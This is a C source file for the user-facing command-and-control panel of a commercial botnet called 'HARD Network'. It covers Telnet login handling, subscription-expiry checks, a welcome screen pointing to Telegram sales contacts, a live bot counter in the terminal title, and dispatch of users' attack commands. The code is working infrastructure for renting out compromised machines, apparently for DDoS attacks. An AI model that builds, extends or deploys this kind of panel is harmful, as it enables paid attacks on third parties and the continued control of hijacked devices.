#include "headers/user_handler.h"
#include "headers/botnet.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <errno.h>
#include <signal.h>
#include <poll.h>

int user_sockets[MAX_USERS] = {0};
pthread_mutex_t user_sockets_mutex = PTHREAD_MUTEX_INITIALIZER;

void setup_signal_handlers() {
    signal(SIGPIPE, SIG_IGN);
}

/* ── MOTD / Welcome Screen ───────────────────────────────────────────────
 * Shown on login, clear, cls, and home.
 * Brand color: LIGHT_BLUE (\033[38;2;0;85;255m)
 * ──────────────────────────────────────────────────────────────────────── */
void send_motd(const User *user, const char *ssh_client, int client_socket) {
    /* Days remaining until plan expires */
    char days_buf[32];
    if (user->expire_time == 0) {
        snprintf(days_buf, sizeof(days_buf), "unlimited");
    } else {
        time_t now = time(NULL);
        long days = (long)((user->expire_time - now) / 86400);
        if (days < 0) days = 0;
        snprintf(days_buf, sizeof(days_buf), "%ld", days);
    }

    char motd[2048];
    snprintf(motd, sizeof(motd),
        /* Clear screen, cursor home, explicit reset so login GRAY doesn't bleed in */
        "\033[2J\033[H" RESET
        "\r\n"
        "Welcome " LIGHT_BLUE "\"" RESET "%s" LIGHT_BLUE "\"" RESET
        " to HARD Network you have "
        LIGHT_BLUE "\"" RESET "%s" LIGHT_BLUE "\"" RESET
        " days left" LIGHT_BLUE "." RESET "\r\n"
        "Type " LIGHT_BLUE "\"" RESET "methods" LIGHT_BLUE "\"" RESET
        " to see all our Methods" LIGHT_BLUE "." RESET "\r\n"
        "Type " LIGHT_BLUE "\"" RESET "help" LIGHT_BLUE "\"" RESET
        " to see all available commands" LIGHT_BLUE "." RESET "\r\n"
        "\r\n"
        "Telegram"     LIGHT_BLUE ":" RESET " https://t.me/hardnetw\r\n"
        "PowerProof"   LIGHT_BLUE ":" RESET " https://t.me/hardpowah\r\n"
        "Contact"      LIGHT_BLUE ":" RESET " https://t.me/keepspin\r\n"
        "\r\n",
        user->user, days_buf
    );
    send(client_socket, motd, strlen(motd), MSG_NOSIGNAL);
}

/* ── Minimal Telnet (RFC 854) helpers ───────────────────────────────────
 *
 * When PuTTY connects in Telnet mode it immediately fires a burst of
 * IAC (0xFF) negotiation bytes before the user touches the keyboard.
 * Without handling these:
 *   • The username buffer gets corrupted by high bytes
 *   • check_login() always returns -1 (bad credentials)
 *
 * We send our negotiation first, drain the client's reply non-blockingly,
 * then strip any stray IAC sequences from every subsequent recv.
 * The protocol stays character-at-a-time (line-buffered by PuTTY since we
 * don't negotiate LINEMODE off — simplest approach that works).
 * ────────────────────────────────────────────────────────────────────── */

/* IAC WILL ECHO      — server echoes; client suppresses local echo
   IAC WILL SUPPRESS-GA
   IAC DO   SUPPRESS-GA
   IAC WONT LINEMODE  — stay in the simplest possible mode             */
static const unsigned char TELNET_HELLO[] = {
    0xFF, 0xFB, 0x03,  /* IAC WILL SUPPRESS-GA */
    0xFF, 0xFD, 0x03,  /* IAC DO   SUPPRESS-GA */
    0xFF, 0xFC, 0x22,  /* IAC WONT LINEMODE    */
};

/* Strip Telnet IAC sequences from buf[0..len-1] in-place.
   Returns the new (shorter) length.
   Handles: WILL/WONT/DO/DONT (3 bytes), other 2-byte cmds,
   and SB...IAC SE subnegotiation blocks.                              */
static ssize_t strip_iac(char *buf, ssize_t len) {
    int in = 0, out = 0;
    while (in < (int)len) {
        unsigned char c = (unsigned char)buf[in];
        if (c != 0xFF) { buf[out++] = buf[in++]; continue; }
        /* IAC */
        if (in + 1 >= (int)len) { in++; continue; }   /* truncated */
        unsigned char cmd = (unsigned char)buf[in + 1];
        if (cmd == 0xFF) {                             /* escaped 0xFF literal */
            buf[out++] = (char)0xFF; in += 2;
        } else if (cmd >= 0xFB && cmd <= 0xFE) {       /* WILL/WONT/DO/DONT */
            in += (in + 2 < (int)len) ? 3 : 2;
        } else if (cmd == 0xFA) {                      /* SB … IAC SE */
            in += 2;
            while (in < (int)len - 1) {
                if ((unsigned char)buf[in] == 0xFF &&
                    (unsigned char)buf[in+1] == 0xF0) { in += 2; break; }
                in++;
            }
        } else {                                       /* NOP, DM, AYT, etc. */
            in += 2;
        }
    }
    return (ssize_t)out;
}

/* Drain the initial IAC burst that PuTTY (Telnet mode) fires on connect.
 * Also negotiates TTYPE so we can read the client's terminal/app name
 * (PuTTY sends "PUTTY", SecureCRT sends "SecureCRT", etc.).
 * Fills ssh_client_out with the name, or falls back to fallback_ip.    */
static void drain_telnet_init(int fd,
                               char *ssh_client_out, size_t ssh_client_sz,
                               const char *fallback_ip) {
    /* Default: just use the IP */
    strncpy(ssh_client_out, fallback_ip, ssh_client_sz - 1);
    ssh_client_out[ssh_client_sz - 1] = '\0';

    unsigned char buf[512];
    struct pollfd pfd = { .fd = fd, .events = POLLIN };

    /* Phase 1: read the client's opening IAC burst (200 ms) */
    if (poll(&pfd, 1, 200) <= 0 || !(pfd.revents & POLLIN)) return;
    ssize_t r = recv(fd, buf, sizeof(buf), MSG_DONTWAIT);
    if (r <= 0) return;

    /* Scan for IAC WILL TTYPE (0xFF 0xFB 0x18) */
    int ttype_offered = 0;
    for (int i = 0; i < (int)r - 2; i++) {
        if (buf[i] == 0xFF && buf[i+1] == 0xFB && buf[i+2] == 0x18) {
            ttype_offered = 1; break;
        }
    }
    if (!ttype_offered) return;

    /* Phase 2: ask the client to send its TTYPE value.
     *  IAC DO TTYPE  +  IAC SB TTYPE SEND IAC SE               */
    static const unsigned char ttype_req[] = {
        0xFF, 0xFD, 0x18,                       /* IAC DO   TTYPE      */
        0xFF, 0xFA, 0x18, 0x01, 0xFF, 0xF0,     /* IAC SB TTYPE SEND IAC SE */
    };
    send(fd, (const char *)ttype_req, sizeof(ttype_req), MSG_NOSIGNAL);

    /* Phase 3: wait for IAC SB TTYPE IS <name> IAC SE (300 ms)  */
    if (poll(&pfd, 1, 300) <= 0 || !(pfd.revents & POLLIN)) return;
    r = recv(fd, buf, sizeof(buf), MSG_DONTWAIT);
    if (r <= 0) return;

    /* Parse IAC SB TTYPE IS (0xFF 0xFA 0x18 0x00) <name> IAC SE */
    for (int i = 0; i < (int)r - 4; i++) {
        if (buf[i]   == 0xFF && buf[i+1] == 0xFA &&
            buf[i+2] == 0x18 && buf[i+3] == 0x00) {
            int start = i + 4, j = start;
            /* Find the trailing IAC SE (0xFF 0xF0) */
            while (j < (int)r - 1 &&
                   !(buf[j] == 0xFF && buf[j+1] == 0xF0)) j++;
            int namelen = j - start;
            if (namelen > 0 && namelen < (int)ssh_client_sz - 1) {
                memcpy(ssh_client_out, buf + start, (size_t)namelen);
                ssh_client_out[namelen] = '\0';
            }
            break;
        }
    }
}

void* update_title(void* arg) {
    int client_socket = *((int*)arg);
    free(arg);
    /* Was static — one buffer shared across all connected clients. Fixed to local. */
    char buffer[128];
    int written;
    while (1) {
        int valid_bots = 0;
        int users_online = 0;
        pthread_mutex_lock(&bot_mutex);
        for (int i = 0; i < bot_count; i++) {
            if (!bots[i].is_valid) continue;
            int is_duplicate = 0;
            for (int j = 0; j < i; j++) {
                if (bots[j].is_valid && bots[j].address.sin_addr.s_addr == bots[i].address.sin_addr.s_addr) {
                    is_duplicate = 1;
                    break;
                }
            }
            if (!is_duplicate) valid_bots++;
        }
        pthread_mutex_unlock(&bot_mutex);
        pthread_mutex_lock(&user_sockets_mutex);
        for (int i = 0; i < MAX_USERS; i++) {
            if (user_sockets[i] > 0) {
                users_online++;
            }
        }
        pthread_mutex_unlock(&user_sockets_mutex);
        written = snprintf(buffer, sizeof(buffer), "\0337\033]0;Hard Raw ~ Bots: %d ~ Users: %d ~ t.me/keepspin\007\0338", valid_bots, users_online);
        if (written > 0 && written < (int)sizeof(buffer) && client_socket > 0) {
            if (send(client_socket, buffer, (size_t)written, MSG_NOSIGNAL) < 0) break;
        }
        sleep(2);
    }
    return NULL;
}

void cleanup_user_session(int user_index) {
    pthread_mutex_lock(&user_sockets_mutex);
    if (user_index >= 0 && user_index < MAX_USERS) {
        if (user_sockets[user_index] > 0) {
            shutdown(user_sockets[user_index], SHUT_RDWR);
            close(user_sockets[user_index]);
            user_sockets[user_index] = 0;
        }
        if (user_index < user_count) {
            users[user_index].is_logged_in = 0;
        }
    }
    pthread_mutex_unlock(&user_sockets_mutex);
}

static void refresh_socket_state(int user_index) {
    pthread_mutex_lock(&user_sockets_mutex);
    if (user_index >= 0 && user_index < MAX_USERS) {
        if (user_sockets[user_index] > 0) {
            char tmp[256];
            while (recv(user_sockets[user_index], tmp, sizeof(tmp), MSG_DONTWAIT) > 0) {}
            int optval = 1;
            setsockopt(user_sockets[user_index], SOL_SOCKET, SO_KEEPALIVE, &optval, sizeof(optval));
        }
    }
    pthread_mutex_unlock(&user_sockets_mutex);
}

void* handle_client(void* arg) {
    setup_signal_handlers();
    int client_socket = *((int*)arg);
    free(arg);
    int optval = 1;
    setsockopt(client_socket, SOL_SOCKET, SO_KEEPALIVE, &optval, sizeof(optval));
    struct sockaddr_in addr;
    socklen_t addr_len = sizeof(addr);
    if (getpeername(client_socket, (struct sockaddr*)&addr, &addr_len) != 0) {
        close(client_socket);
        return NULL;
    }
    char user_ip[INET_ADDRSTRLEN] = {0};
    if (!inet_ntop(AF_INET, &addr.sin_addr, user_ip, sizeof(user_ip))) {
        close(client_socket);
        return NULL;
    }

    /* ── Telnet handshake ───────────────────────────────────────────────
     * Send our negotiation BEFORE the username prompt.
     * Then drain whatever IAC burst the client fires back (200 ms window).
     * Both Telnet and Raw (no IAC reply) clients work after this.       */
    char ssh_client[64];
    send(client_socket, (const char*)TELNET_HELLO, sizeof(TELNET_HELLO), MSG_NOSIGNAL);
    drain_telnet_init(client_socket, ssh_client, sizeof(ssh_client), user_ip);

    /* Was static — shared across all concurrent handle_client threads → race. Fixed. */
    char buffer[256];
    int written;
    char username[64] = {0}, password[64] = {0};
    written = snprintf(buffer, sizeof(buffer), "\r" LIGHT_BLUE "Username: " GRAY);
    if (written <= 0 || written >= (int)sizeof(buffer)) {
        close(client_socket);
        return NULL;
    }
    if (send(client_socket, buffer, (size_t)written, MSG_NOSIGNAL) < 0) {
        close(client_socket);
        return NULL;
    }
    ssize_t len = 0;
    int uidx = 0;
    while (1) {
        len = recv(client_socket, username + uidx, sizeof(username) - 1 - uidx, 0);
        if (len <= 0) { close(client_socket); return NULL; }
        /* Strip any stray IAC bytes PuTTY might send mid-stream */
        len = strip_iac(username + uidx, len);
        int found = 0;
        for (int i = uidx; i < uidx + (int)len; i++) {
            if (username[i] == '\n' || username[i] == '\r') {
                username[i] = 0;
                found = 1;
                break;
            }
        }
        uidx += (int)len;
        if (found) break;
        if (uidx >= (int)sizeof(username) - 1) { close(client_socket); return NULL; }
    }
    /* Strip non-printable residue (covers both Telnet and Raw paths) */
    for (int i = 0; username[i]; i++) {
        if (username[i] < 32 || username[i] > 126) { username[i] = 0; break; }
    }

    /* Password prompt — plain, no masking. Client echoes normally. */
    written = snprintf(buffer, sizeof(buffer), "\r" LIGHT_BLUE "Password: " GRAY);
    if (written <= 0 || written >= (int)sizeof(buffer)) { close(client_socket); return NULL; }
    if (send(client_socket, buffer, (size_t)written, MSG_NOSIGNAL) < 0) { close(client_socket); return NULL; }

    int pidx = 0;
    while (1) {
        len = recv(client_socket, password + pidx, sizeof(password) - 1 - pidx, 0);
        if (len <= 0) { close(client_socket); return NULL; }
        len = strip_iac(password + pidx, len);
        int found = 0;
        for (int i = pidx; i < pidx + (int)len; i++) {
            if (password[i] == '\r' || password[i] == '\n') {
                password[i] = 0; found = 1; break;
            }
        }
        pidx += (int)len;
        if (found) break;
        if (pidx >= (int)sizeof(password) - 1) { password[sizeof(password)-1] = 0; break; }
    }
    /* Strip any residual non-printable bytes */
    for (int i = 0; password[i]; i++) {
        if (password[i] < 32 || password[i] > 126) { password[i] = 0; break; }
    }
    int user_index = check_login(username, password);
    if (user_index == -3) {
        /* Plan expired — always re-check from disk in case owner just added days. */
        load_users();
        user_index = check_login(username, password);
    }
    if (user_index == -3) {
        const char *expired_msg = "\r\n" RED "Plan Expired. Contact t.me/keepspin\r\n" RESET;
        send(client_socket, expired_msg, strlen(expired_msg), MSG_NOSIGNAL);
        close(client_socket);
        return NULL;
    }
    if (user_index == -1) {
        load_users();
        user_index = check_login(username, password);
        if (user_index == -1) {
            snprintf(buffer, sizeof(buffer), "\r" RED "Invalid login" RESET "\r\n");
            send(client_socket, buffer, strlen(buffer), MSG_NOSIGNAL);
            close(client_socket);
            return NULL;
        }
    }
    while (user_index == -2) {
        int found = 0;
        for (int i = 0; i < user_count; i++) {
            if (strcmp(username, users[i].user) == 0 && strcmp(password, users[i].pass) == 0) {
                if (user_sockets[i] != 0) {
                    char tmp;
                    ssize_t alive = recv(user_sockets[i], &tmp, 1, MSG_PEEK | MSG_DONTWAIT);
                    if (alive == 0 || (alive < 0 && errno != EAGAIN && errno != EWOULDBLOCK)) {
                        cleanup_user_session(i);
                    } else {
                        found = 1;
                    }
                } else {
                    users[i].is_logged_in = 0;
                }
            }
        }
        if (!found) {
            user_index = check_login(username, password);
            if (user_index != -2) break;
        }
        snprintf(buffer, sizeof(buffer), "\r" YELLOW "User connected already, Disconnect? Y/N: " RESET);
        if (send(client_socket, buffer, strlen(buffer), MSG_NOSIGNAL) < 0) {
            close(client_socket);
            return NULL;
        }
        char response[8] = {0};
        len = recv(client_socket, response, sizeof(response) - 1, 0);
        if (len <= 0) {
            close(client_socket);
            return NULL;
        }
        response[len] = 0;
        response[strcspn(response, "\r\n")] = 0;
        if (strcasecmp(response, "Y") == 0) {
            for (int i = 0; i < user_count; i++) {
                if (strcmp(username, users[i].user) == 0 && strcmp(password, users[i].pass) == 0) {
                    cleanup_user_session(i);
                }
            }
            user_index = check_login(username, password);
        } else {
            close(client_socket);
            return NULL;
        }
    }
    if (user_index >= 0) {
        User *user = &users[user_index];
        if (user_sockets[user_index] > 0) {
            cleanup_user_session(user_index);
        }
        user_sockets[user_index] = client_socket;
        user->is_logged_in = 1;
        refresh_socket_state(user_index);
        /* Show welcome MOTD on login (ssh_client = TTYPE name or fallback IP) */
        send_motd(user, ssh_client, client_socket);
        pthread_t update_thread;
        int *update_arg = malloc(sizeof(int));
        if (!update_arg) {
            close(client_socket);
            user->is_logged_in = 0;
            user_sockets[user_index] = 0;
            return NULL;
        }
        *update_arg = client_socket;
        pthread_create(&update_thread, NULL, update_title, update_arg);
        pthread_detach(update_thread);
        char command[MAX_COMMAND_LENGTH];
        char prompt[256];
        while (1) {
            struct pollfd pfd = {0};
            pfd.fd = client_socket;
            pfd.events = POLLIN | POLLHUP | POLLERR;
            int pollres = poll(&pfd, 1, 0);
            if (pollres > 0 && (pfd.revents & (POLLHUP | POLLERR))) {
                close(client_socket);
                user->is_logged_in = 0;
                user_sockets[user_index] = 0;
                break;
            }

            /* Mid-session plan expiry check — fires every command cycle.
               Root users (expire_time == 0) are always exempt. */
            if (user->expire_time > 0 && time(NULL) >= user->expire_time) {
                const char *exp_msg = "\r\n" RED "Plan Expired. Contact t.me/keepspin\r\n" RESET;
                send(client_socket, exp_msg, strlen(exp_msg), MSG_NOSIGNAL);
                close(client_socket);
                user->is_logged_in = 0;
                user_sockets[user_index] = 0;
                break;
            }

            sync_user_root_status(user);
            snprintf(prompt, sizeof(prompt),
                "\r" RESET "%s" LIGHT_BLUE "@" RESET "raw" LIGHT_BLUE "~#" RESET " ",
                user->user);
                
            if (send(client_socket, prompt, strlen(prompt), MSG_NOSIGNAL) < 0) break;
            memset(command, 0, sizeof(command));
            ssize_t len = recv(client_socket, command, sizeof(command) - 1, 0);
            /* Strip Telnet IAC keepalives / stray negotiation bytes */
            if (len > 0) len = strip_iac(command, len);
            command[len > 0 ? len : 0] = '\0';
            if (len <= 0) {
                close(client_socket);
                user->is_logged_in = 0;
                user_sockets[user_index] = 0;
                break;
            }
            command[len] = 0;
            int cmd_idx = 0;
            for (int i = 0; i < len; i++) {
                if (command[i] == '\r' || command[i] == '\n' || command[i] < 32) {
                    break;
                }
                if (command[i] >= 32 && command[i] <= 126) {
                    command[cmd_idx++] = command[i];
                }
            }
            command[cmd_idx] = 0;
            if (strlen(command) == 0) {
                continue;
            }
            process_command(user, command, client_socket, user_ip);
        }
    }
    return NULL;
}
